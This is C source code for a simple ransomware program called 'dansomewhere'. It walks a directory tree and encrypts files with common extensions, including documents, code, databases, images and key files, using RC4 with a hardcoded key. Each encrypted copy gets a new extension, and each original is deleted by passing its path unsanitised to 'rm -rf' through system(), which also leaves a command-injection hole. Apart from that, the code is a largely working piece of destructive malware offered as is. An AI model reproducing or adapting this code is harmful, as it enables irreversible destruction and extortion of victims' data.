#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <stdbool.h>

#define N 256   // 2^8



//-------------------------------------------------------------------------------------------------------------
void swap(unsigned char *a, unsigned char *b) {
    int tmp = *a;
    *a = *b;
    *b = tmp;
}

int KSA(char *key, unsigned char *S) {

    int len = strlen(key);
    int j = 0;

    for(int i = 0; i < N; i++)
        S[i] = i;

    for(int i = 0; i < N; i++) {
        j = (j + S[i] + key[i % len]) % N;

        swap(&S[i], &S[j]);
    }

    return 0;
}

int PRGA(unsigned char *S, char *plaintext, unsigned char *ciphertext) {

    int i = 0;
    int j = 0;

    for(size_t n = 0, len = strlen(plaintext); n < len; n++) {
        i = (i + 1) % N;
        j = (j + S[i]) % N;

        swap(&S[i], &S[j]);
        int rnd = S[(S[i] + S[j]) % N];

        ciphertext[n] = rnd ^ plaintext[n];

    }

    return 0;
}

int RC4(char *key, char *plaintext, unsigned char *ciphertext) {

    unsigned char S[N];
    KSA(key, S);

    PRGA(S, plaintext, ciphertext);

    return 0;
}
//-------------------------------------------------------------------------------------------------------------




int getFileSize(char *path)
{
	struct stat st;
	stat(path, &st);
	int size = st.st_size;

	return size;
}
	

char* readFile(char* path)
{
	int fd, size;
	char* buffer;

	if((fd = open(path, O_RDONLY)) < 0)
	{
		//printf("%s", path);
		printf("Error open file : %s\n", strerror(errno));
	}
	else
	{
		size = getFileSize(path);
		buffer = (char *)malloc(size);
		read(fd, buffer, size);
	}

	return buffer; 

}

void* WriteFile(char* pathOriginalFile, char* pathWriteFile, char* buffer)
{
	int fd, size;
	char command[256] = "touch "; 
	char command2[256] = "rm -rf ";


	strcat(command, pathWriteFile);
	system(command);

	if((fd = open(pathWriteFile, O_WRONLY)) < 0)
	{
		//printf("%s \n", pathWriteFile);
		printf("Error open file : %s\n", strerror(errno));
	}
	else
	{
		size = getFileSize(pathOriginalFile);
		write(fd, buffer, size);
	}

	strcat(command2, pathOriginalFile);
	system(command2);

}

int checkExt(char *filePath)
{
	char *ext[] = {
".php", ".html", ".tar", ".gz", ".sql", ".js", ".c", ".o", ".cpp",
".css", ".txt" ".pdf", ".tgz", ".war", ".jar", ".java", ".class", "evtx" 
".ruby", ".rar", ".zip", ".db", ".7z", ".doc", ".pdf", ".h", ".out"
".xls", ".properties", ".xml" ".jpg", ".jpeg", ".png", ".cpp", ".py", 
".gif", ".mov", ".avi", ".wmv", ".mp3", ".mp4", ".wma", ".md", ".asm"
".aac", ".wav", ".pem", ".pub", ".docx", ".apk", ".exe", ".json", ".png"
".dll", ".tpl", ".psd", ".asp", ".phtml", ".aspx," ".csv", ".cs", ".JPG"};

char *ext1 = strrchr(filePath, '.');
int size = sizeof(ext) / sizeof(char *);


if(ext1 == NULL)
	return 1;
else
{
	for(int i = 0; i < size; i++)
		if (!strcmp(ext[i], ext1))
			return 0;
}
	return 1;

}


char *extractFileExtention(char* arr)
{
	int j = 0;
	char* tmp = malloc(256);
	for(int i = strlen(arr); i >= 0; i--)
	{
		if(arr[i] ==  '.')
			break;
		else
			j++;
	}
	strcpy(tmp, arr);

	tmp[strlen(arr) - j] = '\0';


	return tmp;
}

void encrypt(char* path)
{

	char *buffer = readFile(path);
	int size = getFileSize(path) * 2;

	char *buffer2 = malloc(sizeof(int) * size);

	RC4("TeTeGoEt", buffer, buffer2);



//add new extention for encrypt file 
	char *path_tmp = extractFileExtention(path);
	strcat(path_tmp, ".vidutmahoasieunguyhiem");

	//printf("%s",path_tmp);
	//printf("\n");



//overwirte encrypt data into originial file 
	WriteFile(path, path_tmp, buffer2);


	free(path_tmp);
	free(buffer);
	free(buffer2);
}

void findFile(char* path)
{
	DIR *dir;
	struct dirent *entry;

	if((dir = opendir(path)) == NULL)
		perror("opendir() error");
	
	else
	{
		while((entry = readdir(dir)) != NULL)
		{
			if(strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0)
			{
				if(entry->d_type == DT_DIR)
				{
					char tmppath[2048];
					strcpy(tmppath, path);
					strcat(tmppath, "/");
					strcat(tmppath, entry->d_name);
					findFile(tmppath);	
				}
				else
				{
					char tmppath2[2048];
					sprintf(tmppath2, "%s/%s", path, entry->d_name);
					if(!checkExt(tmppath2))
					{	
						encrypt(tmppath2);
					}
				}

			}
		}

	}
	closedir(dir);

}


int main(int argc, char** argv)
{

	
	if(argc != 2)
	{
		printf("USAGE: ./dansomewhere path\n");
		exit(0);
	}
	else
		findFile(argv[1]);
	return 0;
}
